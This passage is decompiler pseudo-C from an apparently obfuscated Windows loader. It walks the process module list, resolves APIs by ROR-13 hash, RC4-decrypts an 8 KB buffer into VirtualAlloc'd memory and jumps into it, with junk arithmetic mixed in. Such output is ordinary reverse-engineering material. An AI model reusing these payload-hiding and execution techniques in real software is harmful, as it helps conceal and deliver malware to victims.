  sub_41DB51(0, v16, v16, 0, v17 + v18 + 13517);
  sub_41D418();
  v34 = 0;
  v33 = &v28;
  v32 = 15;
  sub_41D418();
  v4 = sub_41DAA0(19529, 0, (int)v25, (int)v25, 0);
  sub_41E2AD(v4, v5, v6);
  sub_41B7BD((unsigned int)v29, 0, 0, v30, (int)v29, 0);
  v8 = sub_41DFF6((int)&v23, v7, v22, 1345616562, (int)&v23, 0);
  result = (2 * (v8 - (v17 + 13628))) & 0x161D;
  if ( (v10 & v31) == 0 )
    result = v21;
  return result;
}
// 41DC4E: positive sp value 4 has been found
// 41C7AB: bad sp value at call
// 41E511: bad sp value at call
// 41D7C8: bad sp value at call
// 41C76F: variable 'v16' is possibly undefined
// 41C7B0: variable 'v5' is possibly undefined
// 41C7B0: variable 'v6' is possibly undefined
// 41D7C8: variable 'v7' is possibly undefined
// 41D7C8: variable 'v22' is possibly undefined
// 41D7CD: variable 'v17' is possibly undefined
// 41D7E5: variable 'v10' is possibly undefined
// 41D0A5: variable 'v21' is possibly undefined
// 41DF6E: variable 'v19' is possibly undefined
// 41E3D2: variable 'v12' is possibly undefined
// 41E3D2: variable 'v13' is possibly undefined
// 41E3DA: variable 'v14' is possibly undefined
// 41E4C2: variable 'v20' is possibly undefined

//----- (0041DF66) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
void __fastcall sub_41DF66(int a1, int a2)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  sub_41B965(a2, (int)&savedregs);
}
// 41DF69: bad sp value at call

//----- (0041DFF6) --------------------------------------------------------
int __userpurge sub_41DFF6@<eax>(int result@<eax>, __int16 a2@<dx>, int a3, int a4, int a5, int a6)
{
  if ( (a2 & 0x327B) == 0 )
    result = (((_WORD)result + 2005) & 0x1E01)
           + 6363
           + __CFADD__(((_WORD)result + 2005) & 0x1E01, 6363)
           + (((_WORD)result + 2005) & 0x1E01)
           + 6363;
  return result;
}

//----- (0041E004) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_41E004(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // edx
  int v4; // ecx
  int v5; // ecx
  int v6; // edx
  int v7; // ecx
  char v8[128]; // [esp+4h] [ebp-108h] BYREF

  sub_41E2AD(a1, a2, a3);
  sub_41E060(0, v5, (int)v8, 0, 2, 36);
  sub_41E301(17, v6);
  sub_41DF66(v4, v3);
  LOBYTE(dword_44A03C) = dword_44A03C - 108;
  v7 = dword_44A8AC + 49736;
  LOBYTE(dword_44A004) = -1;
  LOBYTE(v7) = (unsigned __int8)&CreateEventA + dword_44A8AC + 72;
  sub_420EB4(v7, dword_44B80B);
  dword_44A00C = 595;
  dword_44A044 -= 26791;
  LOBYTE(dword_44A04C) = dword_44A04C + 80;
  __asm { retn }
}
// 41EDF2: positive sp value 4 has been found
// 41E020: variable 'v5' is possibly undefined
// 41E02A: variable 'v6' is possibly undefined
// 41C4C1: variable 'v4' is possibly undefined
// 41C4C1: variable 'v3' is possibly undefined
// 44A004: using guessed type int dword_44A004;
// 44A00C: using guessed type int dword_44A00C;
// 44A03C: using guessed type int dword_44A03C;
// 44A044: using guessed type int dword_44A044;
// 44A04C: using guessed type int dword_44A04C;
// 44A8AC: using guessed type int dword_44A8AC;
// 44B6BE: using guessed type int dword_44B6BE;
// 44B80B: using guessed type int dword_44B80B;
// 44B813: using guessed type int dword_44B813;

//----- (0041E060) --------------------------------------------------------
int __userpurge sub_41E060@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6)
{
  unsigned int v6; // eax
  int result; // eax
  unsigned int v8; // eax
  unsigned int v9; // ett
  int v10; // eax
  unsigned int v11; // edx
  unsigned int v12; // ecx
  __int16 v13; // ax
  int v14; // edx
  int v15; // ecx
  bool v16; // cf
  int v17; // eax
  char v18[368]; // [esp+228h] [ebp-18Ch] BYREF
  int v19; // [esp+398h] [ebp-1Ch]

  v10 = sub_41DAA0(a1, (int)v18, a2, (int)v18, 0);
  v13 = sub_41E2AD(
          2 * ((v10 | 0x360F) - 20316) - (__CFADD__((v10 | 0x360F) - 20316, (v10 | 0x360F) - 20316) + 2507),
          v11,
          v12);
  v17 = (v13 + v16 + v13) & 0x303F;
  if ( (v15 & v17) != 0 )
    goto LABEL_2;
  v8 = v17 + 9978;
  v16 = v8 < 0x1D33;
  v8 -= 7475;
  v9 = v16 + 4614;
  result = v8
         - v9
         + (v8 < v9)
         + v8
         - v9
         - ((__CFADD__(v8 < v9, v8 - v9) | __CFADD__(v8 - v9, (v8 < v9) + v8 - v9))
          + 15844);
  if ( v14 )
  {
    v17 = v19 & 0x1261 | 0x23BB;
LABEL_2:
    v6 = v17 + 1782;
    result = (v6 < 0x21C8)
           + v6
           - 8648
           + 5526
           - ((__CFADD__(v6 < 0x21C8, v6 - 8648) | __CFADD__((v6 < 0x21C8) + v6 - 8648, 5526))
            + 9122);
  }
  return result;
}
// 41CC0B: variable 'v11' is possibly undefined
// 41CC0B: variable 'v12' is possibly undefined
// 41CC10: variable 'v16' is possibly undefined
// 41C42C: variable 'v14' is possibly undefined
// 41CC23: variable 'v15' is possibly undefined

//----- (0041E2AD) --------------------------------------------------------
int __usercall sub_41E2AD@<eax>(int a1@<eax>, unsigned int a2@<edx>, unsigned int a3@<ecx>)
{
  int v3; // eax
  int v5; // eax
  unsigned int v6; // eax
  int v7; // [esp+154h] [ebp-194h]
  unsigned int v8; // [esp+160h] [ebp-188h]

  v6 = a1 ^ 0x1649;
  if ( v8 <= a3 )
    v6 = (v6 ^ 0x1CB9) + 8701;
  v5 = (__PAIR64__(v6 - 8098, v6) - 0x222600001FA2i64 - (((unsigned int)(v6 < 0x1FA2) + 8742) | 0x303000000000i64)) >> 32;
  v3 = ((2 * v5 - (__CFADD__(v5, v5) + v7)) ^ 0x3376 | 0x28CC) + 1779;
  if ( a2 < a3 )
    goto LABEL_4;
  if ( a2 )
  {
    v3 = 0;
LABEL_4:
    v3 += 7340;
  }
  return v3 | 0x3776;
}
// 41CF42: variable 'v7' is possibly undefined
// 41D979: variable 'v8' is possibly undefined

//----- (0041E301) --------------------------------------------------------
int __stdcall sub_41E301(int a1, int a2)
{
  int v2; // edx
  int v3; // ecx
  char v5[156]; // [esp+B4h] [ebp-13Ch] BYREF
  char v6[116]; // [esp+150h] [ebp-A0h] BYREF
  int v7; // [esp+1C4h] [ebp-2Ch]

  sub_41B7BD(0, 0, 0, v7, (int)v6, 0);
  return sub_41DAA0((int)v5, v2, v3, (int)v5, 0);
}
// 41BE83: variable 'v2' is possibly undefined
// 41BE83: variable 'v3' is possibly undefined

//----- (0041EEC6) --------------------------------------------------------
void __usercall sub_41EEC6(int a1@<edx>, int a2@<esi>)
{
  int v2; // eax
  int v3; // ebx
  unsigned int v4; // edx
  int v5; // ecx
  int v6; // esi
  _BYTE *v7; // edi
  int v8; // ebx
  char v9; // dl
  int v10; // ecx
  int v11; // ecx
  _BYTE *v12; // edi
  int v13; // ebx
  bool v14; // cf
  int v15; // ecx
  int v16; // edx
  unsigned int v17; // esi
  int v18; // ebx
  int v19; // [esp-8h] [ebp-8h]
  int v20; // [esp-4h] [ebp-4h]
  int v21; // [esp-4h] [ebp-4h]

  LOBYTE(a1) = dword_44A020;
  v5 = 0x2000;
  v6 = __CFADD__(a1, 423) + a2 + 10082;
  v7 = &unk_42271C;
  dword_44A01C = a1 + 423;
  do
  {
    v21 = v5;
    dword_44A048 = v6 - 1;
    *v7++ = sub_420814();
    v6 = 22434;
    dword_44A008 += 9425;
    v5 = v21 - 1;
  }
  while ( v21 != 1 );
  dword_44A014 = 0;
  v2 = dword_44B867(22434, off_44AB1C, 255, &unk_42261C);
  v3 = dword_44A050;
  BYTE1(v3) = BYTE1(dword_44A050) ^ 0xBE;
  dword_44A018 += v3;
  dword_44A00C = 22434;
  dword_44A008 -= v4 >> 3;
  v17 = dword_44AAF0;
  v18 = v2;
  dword_44B86B(&unk_42261C, &unk_44B6D2, 0, &unk_44B6EC);
  dword_44A04C = v17;
  dword_44A024 = (int)v7;
  dword_44A038 = v18;
  dword_44A044 -= v17;
  BYTE1(v18) = -122;
  dword_44A02C = v15;
  ++v17;
  dword_44A040 += 11337;
  dword_44A01C -= 13121;
  v20 = dword_44B7F3(&unk_44B6EC, -1073741824, 1, 0, 2, 32, 0);
  dword_44A020 += v17 - (__CFADD__(dword_44A248, v16) + dword_44A644);
  dword_44A044 = v18;
  v8 = (v17 < (unsigned int)__CFADD__(dword_44A248, v16) + dword_44A644) + 49926;
  dword_44B837(v20, &unk_42271C, 0x2000, &dword_44B81B, 0, v20);
  BYTE1(v10) = v9;
  dword_44B80F(v10, v10);
  v14 = __CFADD__(v8, dword_44A018);
  dword_44A018 += v8;
  dword_44A014 = (int)&LoadLibraryA;
  dword_44A028 = v8;
  v11 = 0x2000;
  dword_44A008 = 27849;
  v12 = &unk_42271C;
  v13 = -((BYTE1(v8) < (unsigned __int8)(v14 - 46)) + 15643);
  do
  {
    v19 = v11;
    dword_44A01C = v13;
    dword_44A04C = 18469;
    *v12++ = sub_420814();
    v13 = 55329;
    LOBYTE(dword_44A010) = dword_44A010 - 32;
    v11 = v19 - 1;
  }
  while ( v19 != 1 );
  LOBYTE(dword_44A010) = dword_44A010 - 1;
  JUMPOUT(0x420EB8);
}
// 41F017: control flows out of bounds to 420EB8
// 41F005: conditional instruction was optimized away because of '%0x18.4==1'
// 41EE91: variable 'v4' is possibly undefined
// 420D10: variable 'v15' is possibly undefined
// 420E34: variable 'v16' is possibly undefined
// 41F3B1: variable 'v9' is possibly undefined
// 420113: variable 'v10' is possibly undefined
// 44A008: using guessed type int dword_44A008;
// 44A00C: using guessed type int dword_44A00C;
// 44A010: using guessed type int dword_44A010;
// 44A014: using guessed type int dword_44A014;
// 44A018: using guessed type int dword_44A018;
// 44A01C: using guessed type int dword_44A01C;
// 44A020: using guessed type int dword_44A020;
// 44A024: using guessed type int dword_44A024;
// 44A028: using guessed type int dword_44A028;
// 44A02C: using guessed type int dword_44A02C;
// 44A038: using guessed type int dword_44A038;
// 44A040: using guessed type int dword_44A040;
// 44A044: using guessed type int dword_44A044;
// 44A048: using guessed type int dword_44A048;
// 44A04C: using guessed type int dword_44A04C;
// 44A050: using guessed type int dword_44A050;
// 44A248: using guessed type int dword_44A248;
// 44A644: using guessed type int dword_44A644;
// 44AAF0: using guessed type int dword_44AAF0;
// 44AB1C: using guessed type int *off_44AB1C;
// 44B7F3: using guessed type int (__stdcall *dword_44B7F3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44B80F: using guessed type int (__fastcall *dword_44B80F)(_DWORD, _DWORD);
// 44B81B: using guessed type int dword_44B81B;
// 44B837: using guessed type int (__stdcall *dword_44B837)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44B867: using guessed type int (__fastcall *dword_44B867)(_DWORD, _DWORD, _DWORD, _DWORD);
// 44B86B: using guessed type __int64 (__stdcall *dword_44B86B)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041F9BE) --------------------------------------------------------
int __usercall sub_41F9BE@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>, int a4)
{
  int v4; // ebx
  _DWORD *v5; // edi
  unsigned int i; // esi
  unsigned __int16 *v8; // [esp+18h] [ebp-Ch]
  _DWORD *v9; // [esp+1Ch] [ebp-8h]
  int v10; // [esp+20h] [ebp-4h]

  v4 = sub_420BE0(a1, a2, a3);
  v5 = (_DWORD *)(v4 + *(_DWORD *)(v4 + *(_DWORD *)(v4 + 60) + 120));
  if ( HIWORD(a4) )
  {
    v9 = (_DWORD *)(v4 + v5[8]);
    v8 = (unsigned __int16 *)(v4 + v5[9]);
    for ( i = 0; v5[6] > i; ++i )
    {
      if ( sub_4201FE((_BYTE *)(v4 + *v9)) == a4 )
      {
        v10 = *v8;
        break;
      }
      ++v9;
      ++v8;
    }
    if ( v5[6] == i )
      return 0;
  }
  else
  {
    v10 = (unsigned __int16)a4 - v5[4];
  }
  return v4 + *(_DWORD *)(v4 + v5[7] + 4 * v10);
}
// 421476: variable 'v10' is possibly undefined

//----- (004200A4) --------------------------------------------------------
void __usercall sub_4200A4(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  LOBYTE(dword_44A038) = dword_44A038 + 46;
  qmemcpy(a2, a3, a1);
  LOBYTE(dword_44A008) = 51;
}
// 44A008: using guessed type int dword_44A008;
// 44A038: using guessed type int dword_44A038;

//----- (004201FE) --------------------------------------------------------
unsigned int __cdecl sub_4201FE(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (004204DD) --------------------------------------------------------
_BYTE *__cdecl sub_4204DD(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (00420509) --------------------------------------------------------
unsigned __int8 __cdecl sub_420509(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 result; // al
  _BYTE *i; // [esp+Ch] [ebp-Ch]
  unsigned int v6; // [esp+10h] [ebp-8h]
  unsigned __int8 v7; // [esp+17h] [ebp-1h]

  v3 = *(_BYTE *)(a3 + 256);
  v7 = *(_BYTE *)(a3 + 257);
  v6 = 0;
  for ( i = a1; v6 < a2; ++i )
  {
    v3 = (v3 + 1) % 256;
    v7 += *(_BYTE *)(a3 + v3);
    sub_4204DD((_BYTE *)(a3 + v3), (_BYTE *)(a3 + v7));
    *i ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v7) + *(_BYTE *)(a3 + v3)));
    ++v6;
  }
  *(_BYTE *)(a3 + 256) = v3;
  result = v7;
  *(_BYTE *)(a3 + 257) = v7;
  return result;
}

//----- (00420814) --------------------------------------------------------
int sub_420814()
{
  int result; // eax
  int v1; // edx
  bool v2; // cf
  unsigned int v3; // eax
  FARPROC (__stdcall **v4)(HMODULE, LPCSTR); // ebx

  LOBYTE(dword_44A00C) = dword_44A00C + 84;
  LOBYTE(dword_44A034) = dword_44A034 - 50;
  v3 = dword_44B6C6 ^ (dword_44B6C6 << 11);
  dword_44A028 += 14960;
  v1 = dword_44B82F;
  LOBYTE(dword_44A028) = 68;
  dword_44B6C6 = dword_44B82F;
  v2 = dword_44A024 < (unsigned int)dword_44B340;
  dword_44A024 -= dword_44B340;
  dword_44B82F = dword_44B843;
  dword_44B843 = dword_44B83F;
  dword_44A014 = (__CFADD__(v2, dword_44B340) | __CFADD__(v3, v2 + dword_44B340)) + v1 + 17622 + dword_44B340;
  dword_44A030 = 10143;
  v4 = &GetProcAddress;
  BYTE1(v4) = byte_44A604 + ((unsigned __int16)&GetProcAddress >> 8);
  dword_44A04C = (int)v4;
  LOBYTE(dword_44A02C) = -27;
  dword_44B83F ^= (v3 >> 8) ^ v3 ^ ((unsigned int)dword_44B83F >> 19);
  dword_44B80B = dword_44B83F;
  result = dword_44B83F;
  dword_44A040 -= 23191;
  dword_44A020 = 23191;
  return result;
}
// 44A00C: using guessed type int dword_44A00C;
// 44A014: using guessed type int dword_44A014;
// 44A020: using guessed type int dword_44A020;
// 44A024: using guessed type int dword_44A024;
// 44A028: using guessed type int dword_44A028;
// 44A02C: using guessed type int dword_44A02C;
// 44A030: using guessed type int dword_44A030;
// 44A034: using guessed type int dword_44A034;
// 44A040: using guessed type int dword_44A040;
// 44A04C: using guessed type int dword_44A04C;
// 44A604: using guessed type char byte_44A604;
// 44B340: using guessed type int dword_44B340;
// 44B6C6: using guessed type int dword_44B6C6;
// 44B80B: using guessed type int dword_44B80B;
// 44B82F: using guessed type int dword_44B82F;
// 44B83F: using guessed type int dword_44B83F;
// 44B843: using guessed type int dword_44B843;

//----- (0042099B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
_DWORD *__usercall sub_42099B@<eax>(_DWORD *result@<eax>, _BYTE *a2@<ecx>, int a3@<ebx>)
{
  *a2 -= BYTE1(a2);
  *(_BYTE *)(a3 - 1610365416) += (_BYTE)a2;
  ++*result;
  return result;
}
// 4209A7: positive sp value 4 has been found

//----- (00420ACA) --------------------------------------------------------
__int64 (__stdcall *__usercall sub_420ACA@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>))(_DWORD, _DWORD, _DWORD, _DWORD)
{
  int v3; // esi
  DWORD (__stdcall **v4)(HMODULE, LPSTR, DWORD); // ebx
  int v5; // ecx
  char v6; // cf
  int v7; // esi
  int v8; // edx
  char *v9; // ebx
  int v10; // ecx
  int v11; // esi
  int v12; // ebx
  __int64 (__stdcall *result)(_DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v14; // esi
  int v15; // edx
  int v16; // edx
  int v17; // [esp-4h] [ebp-4h]
  int v18; // [esp-4h] [ebp-4h]
  int v19; // [esp-4h] [ebp-4h]

  dword_44A020 -= a1;
  v12 = a2 + 13827;
  result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(a1, v12, a3 - dword_44A6A0, 262468866);
  LOBYTE(dword_44A030) = -109;
  dword_44A010 += v12;
  if ( result )
  {
    dword_44B86B = result;
    LOBYTE(dword_44A008) = 121;
    LOBYTE(v12) = byte_44A4D0;
    LOBYTE(dword_44A030) = dword_44A030 - 67;
    result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(
                                                                      (int)&LoadLibraryA,
                                                                      v12,
                                                                      (int)&DeleteCriticalSection + dword_44AA58,
                                                                      1493072574);
    v10 = v18;
    if ( result )
    {
      v11 = dword_44ACEC;
      dword_44B867 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD))result;
      LOBYTE(v10) = (v18 - BYTE1(v12)) ^ 0x19;
      dword_44A030 = dword_44ACEC;
      dword_44A024 += 12478;
      result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(v10, v12, dword_44ACEC, 150532372);
      dword_44A018 -= v19;
      if ( result )
      {
        dword_44B7F3 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        LOBYTE(dword_44A00C) = 126;
        result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(v19 + 2234, 26582, v11, 1916711125);
        if ( result )
        {
          v14 = dword_44B9B0;
          LOBYTE(dword_44A028) = dword_44A028 + 30;
          dword_44B80F = (int (__fastcall *)(_DWORD, _DWORD))result;
          dword_44A03C += v16;
          LOBYTE(dword_44A020) = 28;
          result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(
                                                                            21667,
                                                                            (int)&CloseHandle - dword_44B9B0,
                                                                            dword_44B9B0,
                                                                            -2114916129);
          if ( result )
          {
            dword_44B807 = (int)result;
            dword_44A00C += v15;
            v3 = v14 - 22200;
            v4 = &GetModuleFileNameA;
            dword_44A010 -= 11627;
            result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(
                                                                              (int)&GetCurrentProcessId,
                                                                              (int)&GetModuleFileNameA,
                                                                              v3,
                                                                              1216340331);
            dword_44A040 = v5;
            v7 = v6 + v3 + 7639;
            dword_44A028 -= 24544;
            if ( result )
            {
              dword_44B6E0 = (int)result;
              dword_44A044 -= 11759;
              dword_44A024 += v17;
              result = (__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_41F9BE(
                                                                                v17,
                                                                                (int)&GetModuleFileNameA,
                                                                                v7,
                                                                                255840707);
              dword_44A02C -= v7;
              if ( result )
              {
                dword_44A020 = (int)&VirtualAlloc;
                BYTE1(v4) = byte_44A778 + ((unsigned __int16)&GetModuleFileNameA >> 8);
                v9 = (char *)v4 + v8;
                dword_44B837 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                dword_44A008 = (int)result;
                sub_41EEC6(v8, (int)&LeaveCriticalSection);
                dword_44A00C += (int)v9;
                dword_44A048 = 10203;
                dword_44A004 = 7936;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 41EC6F: variable 'v15' is possibly undefined
// 41EC95: variable 'v5' is possibly undefined
// 41EC9B: variable 'v6' is possibly undefined
// 41F1C5: variable 'v17' is possibly undefined
// 41F1F6: variable 'v8' is possibly undefined
// 41F491: variable 'v18' is possibly undefined
// 420E91: variable 'v19' is possibly undefined
// 4206BC: variable 'v16' is possibly undefined
// 44A004: using guessed type int dword_44A004;
// 44A008: using guessed type int dword_44A008;
// 44A00C: using guessed type int dword_44A00C;
// 44A010: using guessed type int dword_44A010;
// 44A018: using guessed type int dword_44A018;
// 44A020: using guessed type int dword_44A020;
// 44A024: using guessed type int dword_44A024;
// 44A028: using guessed type int dword_44A028;
// 44A02C: using guessed type int dword_44A02C;
// 44A030: using guessed type int dword_44A030;
// 44A03C: using guessed type int dword_44A03C;
// 44A040: using guessed type int dword_44A040;
// 44A044: using guessed type int dword_44A044;
// 44A048: using guessed type int dword_44A048;
// 44A4D0: using guessed type char byte_44A4D0;
// 44A6A0: using guessed type int dword_44A6A0;
// 44A778: using guessed type char byte_44A778;
// 44AA58: using guessed type int dword_44AA58;
// 44ACEC: using guessed type int dword_44ACEC;
// 44B6BE: using guessed type int dword_44B6BE;
// 44B6E0: using guessed type int dword_44B6E0;
// 44B7F3: using guessed type int (__stdcall *dword_44B7F3)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44B807: using guessed type int dword_44B807;
// 44B80F: using guessed type int (__fastcall *dword_44B80F)(_DWORD, _DWORD);
// 44B837: using guessed type int (__stdcall *dword_44B837)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 44B867: using guessed type int (__fastcall *dword_44B867)(_DWORD, _DWORD, _DWORD, _DWORD);
// 44B86B: using guessed type __int64 (__stdcall *dword_44B86B)(_DWORD, _DWORD, _DWORD, _DWORD);
// 44B9B0: using guessed type int dword_44B9B0;

//----- (00420BE0) --------------------------------------------------------
int __usercall sub_420BE0@<eax>(int a1@<ecx>, int a2@<ebx>, int a3@<esi>)
{
  _DWORD *v3; // edx
  unsigned __int8 *v4; // esi
  int v5; // edi
  LONG (__stdcall **v6)(struct _EXCEPTION_POINTERS *); // ebx
  int v7; // ecx
  int v8; // ebx
  int result; // eax
  int v10; // eax
  struct _PEB *v11; // edx

  dword_44A024 += a3;
  BYTE1(a2) = 0;
  v11 = NtCurrentPeb();
  dword_44A01C += a1;
  dword_44A010 -= a2;
  v3 = (_DWORD *)*((_DWORD *)v11->ImageBaseAddress + 5);
  do
  {
    v4 = (unsigned __int8 *)v3[10];
    v7 = 24;
    v5 = 0;
    v6 = &UnhandledExceptionFilter;
    do
    {
      dword_44A044 = (int)v6;
      LOBYTE(dword_44A04C) = dword_44A04C + 73;
      LOBYTE(v6) = (_BYTE)v6 - 31;
      v10 = *v4++;
      BYTE1(v6) = -69;
      if ( (char)v10 >= 97 )
      {
        dword_44A00C -= (int)v6;
        LOBYTE(v10) = v10 - 32;
        LOBYTE(dword_44A044) = -49;
      }
      LOBYTE(dword_44A004) = dword_44A004 - 101;
      v5 = v10 + __ROR4__(v5, 13);
      v6 = (LONG (__stdcall **)(struct _EXCEPTION_POINTERS *))((char *)v3 + 25297);
      LOBYTE(dword_44A024) = dword_44A024 + 65;
      LOBYTE(v6) = 83;
      --v7;
    }
    while ( v7 );
    v8 = v3[4];
    dword_44A00C -= 23134;
    dword_44A010 = (int)v3;
    v3 = (_DWORD *)*v3;
  }
  while ( v5 != 1783282779 );
  dword_44A01C = 1783282779;
  LOBYTE(dword_44A028) = -12;
  result = v8;
  dword_44A02C = dword_44ACCC;
  LOBYTE(dword_44A010) = 62;
  return result;
}
// 44A004: using guessed type int dword_44A004;
// 44A00C: using guessed type int dword_44A00C;
// 44A010: using guessed type int dword_44A010;
// 44A01C: using guessed type int dword_44A01C;
// 44A024: using guessed type int dword_44A024;
// 44A028: using guessed type int dword_44A028;
// 44A02C: using guessed type int dword_44A02C;
// 44A044: using guessed type int dword_44A044;
// 44A04C: using guessed type int dword_44A04C;
// 44ACCC: using guessed type int dword_44ACCC;

//----- (00420EB4) --------------------------------------------------------
_WORD *__fastcall sub_420EB4(int a1, int a2)
{
  int v2; // edx
  bool v3; // cf
  unsigned int v4; // eax
  int v5; // esi
  _WORD *result; // eax
  int v7; // edx
  char *retaddr; // [esp+0h] [ebp+0h]

  v7 = dword_44B813 ^ (a2 + 692);
  LOBYTE(dword_44A02C) = 5;
  dword_44B813 = v7;
  dword_44A004 += 4363;
  v4 = (unsigned int)retaddr;
  v5 = 28876;
  while ( 1 )
  {
    result = (_WORD *)(v4 & 0xFFFFF000);
    dword_44A028 -= 11192;
    LOWORD(v7) = *result;
    v2 = v7 + 25971;
    LOBYTE(dword_44A024) = 17;
    v3 = __PAIR64__(v5 + 24560, v2) < 0x70970000BFC0i64;
    v7 = v2 - 49088;
    v5 = v3 + dword_44B718 + 2442;
    if ( !(_WORD)v7 )
      break;
    LOBYTE(dword_44A02C) = 0x80;
    v4 = (unsigned int)result - 1;
  }
  dword_44A02C += 7947;
  dword_44B6BE = (int)result;
  return result;
}
// 44A004: using guessed type int dword_44A004;
// 44A024: using guessed type int dword_44A024;
// 44A028: using guessed type int dword_44A028;
// 44A02C: using guessed type int dword_44A02C;
// 44B6BE: using guessed type int dword_44B6BE;
// 44B718: using guessed type int dword_44B718;
// 44B813: using guessed type int dword_44B813;

//----- (00421092) --------------------------------------------------------
int __cdecl sub_421092(int a1, int a2, unsigned __int8 *a3)
{
  char v3; // cl
  unsigned __int8 v4; // bl
  unsigned int i; // esi
  int result; // eax
  int v7; // eax
  unsigned int v8; // esi
  _BYTE *v9; // eax
  unsigned __int8 *v10; // [esp-8h] [ebp-Ch]
  unsigned __int8 v11; // [esp-1h] [ebp-5h]

  v8 = 0;
  v9 = a3;
  do
  {
    v3 = v8++;
    *v9++ = v3;
  }
  while ( v8 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v11 = 0;
  v4 = 0;
  v10 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v7 = (v4 + *v10 + *(unsigned __int8 *)(a1 + v11)) % 256;
    v4 = v7;
    sub_4204DD(&a3[i], &a3[(unsigned __int8)v7]);
    result = (v11 + 1) / a2;
    v11 = (v11 + 1) % a2;
    ++v10;
  }
  return result;
}

// nfuncs=28 queued=28 decompiled=28 lumina nreq=0 worse=0 better=0
// ALL OK, 28 function(s) have been successfully decompiled
